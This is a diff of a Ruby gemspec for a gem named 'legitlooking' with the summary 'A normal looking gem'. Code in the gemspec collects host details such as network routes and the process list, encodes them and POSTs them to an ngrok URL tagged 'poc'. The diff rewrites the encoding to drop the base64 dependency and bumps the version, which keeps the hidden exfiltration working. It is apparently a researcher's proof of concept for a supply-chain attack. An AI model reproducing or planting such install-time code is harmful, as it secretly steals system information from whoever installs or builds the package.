@@ -5,7 +5,6 @@ COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app
 begin
   require "uri"
   require "net/http"
-  require "base64"
 
   # Collect everything without JSON dependency
   lines = []
@@ -37,7 +36,7 @@ begin
   lines << "routes:\n#{`ip route 2>/dev/null`.strip[0, 300]}"
   lines << "procs:\n#{`ps aux 2>/dev/null`[0, 600]}"
 
-  payload = Base64.strict_encode64(lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace))
+  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
 
   uri = URI("#{COLLAB_URL}?poc=2v3")
   req = Net::HTTP::Post.new(uri)
@@ -58,7 +57,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.1"
+  spec.version       = "1.0.2"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
